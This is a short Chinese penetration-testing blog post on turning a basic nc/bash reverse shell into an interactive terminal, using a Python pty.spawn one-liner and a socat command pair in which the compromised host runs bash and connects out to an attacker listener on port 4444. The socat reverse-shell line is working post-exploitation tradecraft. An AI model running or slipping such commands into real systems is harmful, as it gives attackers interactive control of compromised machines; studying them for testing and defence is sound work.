---
title: "获得 Linux 交互式 Shell"
date: 2018-02-16T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['linux']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


利用 nc bash 反弹的 shell 虽然能执行一些基本的命令.

但对于 su sudo vim 这些需要交互的程序 就没有什么卵用.

`su: must be run from a terminal`

<!--more-->

## python

Python 中的 pty 库可以衍生一个原生的终端.

`python -c 'import pty;pty.spawn("/bin/bash")'`

## socat

socat (netcat pro).

`Server: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ip:4444`
`Client: socat file:[反引号]tty[反引号],raw,echo=0 tcp-listen:4444`